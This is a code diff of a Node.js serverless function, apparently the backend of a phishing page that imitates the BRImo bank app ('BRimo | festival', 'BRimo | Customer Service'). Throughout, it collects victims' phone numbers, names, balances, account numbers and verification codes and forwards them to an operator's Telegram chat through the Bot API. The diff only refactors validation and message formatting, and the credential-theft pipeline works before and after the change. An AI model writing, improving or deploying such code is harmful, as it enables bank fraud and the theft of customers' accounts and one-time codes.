@@ -1,14 +1,14 @@
 const axios = require('axios');
 
-exports.handler = async function(event, context) {
-    // CORS headers for preflight requests
+exports.handler = async (event, context) => {
+    // CORS handling for preflight requests
     if (event.httpMethod === 'OPTIONS') {
         return {
             statusCode: 204,
             headers: {
                 'Access-Control-Allow-Origin': '*',
                 'Access-Control-Allow-Headers': 'Content-Type',
-                'Access-Control-Allow-Methods': 'POST'
+                'Access-Control-Allow-Methods': 'POST, OPTIONS'
             },
             body: ''
         };
@@ -19,65 +19,96 @@ exports.handler = async function(event, context) {
         return {
             statusCode: 405,
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message: 'Method Not Allowed' })
+            body: JSON.stringify({ 
+                status: 'error',
+                message: 'Method Not Allowed' 
+            })
         };
     }
 
     try {
-        // Parse the incoming data
+        // Parse incoming data
         const data = JSON.parse(event.body);
-        
-        // Get environment variables
         const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
         const telegramChatId = process.env.TELEGRAM_CHAT_ID;
-        
+
+        // Validate environment variables
         if (!telegramBotToken || !telegramChatId) {
-            throw new Error('Telegram bot configuration is missing');
+            throw new Error('Server configuration error: Telegram credentials missing');
         }
 
-        // Validate required fields based on notification type
-        if (data.type === 'phone_number' && !data.phoneNumber) {
+        // Validate request data
+        if (!data.type) {
             return {
                 statusCode: 400,
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ message: 'Phone number is required' })
+                body: JSON.stringify({
+                    status: 'error',
+                    message: 'Notification type is required'
+                })
             };
         }
 
-        // Format the Telegram message
+        // Format message based on type
         let message;
         switch(data.type) {
             case 'phone_number':
+                if (!data.phoneNumber) {
+                    return {
+                        statusCode: 400,
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            status: 'error',
+                            message: 'Phone number is required'
+                        })
+                    };
+                }
+
                 message = `├• BRimo | festival\n` +
                          `├───────────────────\n` +
-                         `├• NO HP : ${data.phoneNumber || 'Tidak diisi'}\n` +
+                         `├• NO HP : ${data.phoneNumber || '-'}\n` +
                          `├───────────────────\n` +
-                         `├• NAMA  : ${data.name || 'Tidak diisi'}\n` +
+                         `├• NAMA  : ${data.name || '-'}\n` +
                          `├───────────────────\n` +
-                         `├• saldo : ${data.balance ? new Intl.NumberFormat('id-ID').format(data.balance) : 'Tidak diisi'}\n` +
+                         `├• SALDO : ${data.balance ? new Intl.NumberFormat('id-ID').format(data.balance) : '-'}\n` +
                          `╰───────────────────\n` +
-                         `⏱ ${new Date().toLocaleString('id-ID')}`;
+                         `⏱ ${new Date().toLocaleString('id-ID', { 
+                            weekday: 'long',
+                            day: 'numeric',
+                            month: 'long',
+                            year: 'numeric',
+                            hour: '2-digit',
+                            minute: '2-digit',
+                            second: '2-digit'
+                         })}`;
                 break;
-                
+
             case 'contact_service':
-                message = `📞 New Contact Request:\n` +
+                message = `📞 BRimo | Customer Service\n` +
                          `├───────────────────\n` +
-                         `├• Rekening: ${data.accountNumber || 'Tidak diisi'}\n` +
-                         `├• Atas Nama: ${data.accountName || 'Tidak diisi'}\n` +
-                         `├• Saldo: ${data.amount || 'Tidak diisi'}\n` +
-                         `├• Dalam Huruf: ${data.amountInWords || 'Tidak diisi'}\n` +
-                         `├• Kode Verifikasi: ${data.virtualCode || 'Tidak diisi'}\n` +
+                         `├• REKENING : ${data.accountNumber || '-'}\n` +
+                         `├───────────────────\n` +
+                         `├• ATAS NAMA : ${data.accountName || '-'}\n` +
+                         `├───────────────────\n` +
+                         `├• SALDO : ${data.amount || '-'}\n` +
+                         `├───────────────────\n` +
+                         `├• KODE VERIFIKASI : ${data.virtualCode || '-'}\n` +
                          `╰───────────────────\n` +
                          `⏱ ${new Date().toLocaleString('id-ID')}`;
                 break;
-                
+
             default:
-                message = `⚠ Unknown Notification Type\n` +
-                         `├───────────────────\n` +
-                         `╰ ${JSON.stringify(data, null, 2)}`;
+                return {
+                    statusCode: 400,
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        status: 'error',
+                        message: 'Invalid notification type'
+                    })
+                };
         }
 
-        // Send notification to Telegram
+        // Send to Telegram
         const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
         const response = await axios.post(telegramUrl, {
             chat_id: telegramChatId,
@@ -86,31 +117,35 @@ exports.handler = async function(event, context) {
             disable_notification: false
         });
 
+        // Success response
         return {
             statusCode: 200,
             headers: { 
                 'Content-Type': 'application/json',
                 'Access-Control-Allow-Origin': '*' 
             },
-            body: JSON.stringify({ 
-                success: true,
+            body: JSON.stringify({
+                status: 'success',
                 message: 'Notification sent successfully',
-                telegramMessageId: response.data.result.message_id
+                telegram_message_id: response.data.result.message_id,
+                timestamp: new Date().toISOString()
             })
         };
+
     } catch (error) {
-        console.error('Error:', error);
+        console.error('Error processing request:', error);
+        
         return {
             statusCode: 500,
             headers: { 
                 'Content-Type': 'application/json',
                 'Access-Control-Allow-Origin': '*' 
             },
-            body: JSON.stringify({ 
-                success: false,
-                message: 'Failed to send notification',
+            body: JSON.stringify({
+                status: 'error',
+                message: 'Internal server error',
                 error: error.message,
-                stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
+                ...(process.env.NODE_ENV === 'development' && { stack: error.stack })
             })
         };
     }
